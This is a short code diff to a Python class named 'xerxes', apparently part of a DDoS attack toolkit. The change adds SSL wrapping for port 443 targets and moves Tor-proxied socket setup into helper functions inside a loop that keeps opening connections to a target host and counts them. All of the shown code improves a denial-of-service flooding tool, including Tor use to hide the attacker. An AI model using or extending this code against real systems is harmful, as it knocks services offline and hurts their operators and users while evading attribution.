@@ -11,7 +11,9 @@ class xerxes(DDoS_Class):
         duration=60,
         logs=False,
         tor=False,
+        ssl_on=False
     ):
+        self.ssl_on=ssl_on
         self.counter = 0
         self.target = u
         self.port = p
@@ -43,12 +45,12 @@ class xerxes(DDoS_Class):
                 if self.stop == True:
                     break
                 try:
-                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-                    if self.tor == False:
-                        s.settimeout(self.timeout)
-                    if self.tor == True:
-                        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
-                    s.connect((self.target, self.port))
+                    if self.tor==True:
+                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                    else:
+                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                    if self.port==443 or self.ssl_on==True:
+                        s=wrap_socket_with_ssl(s,self.target)
                     self.counter += 1
                     """if self.logs==True:
      #print("[Connected to {}:{}]".format(self.target,self.port))
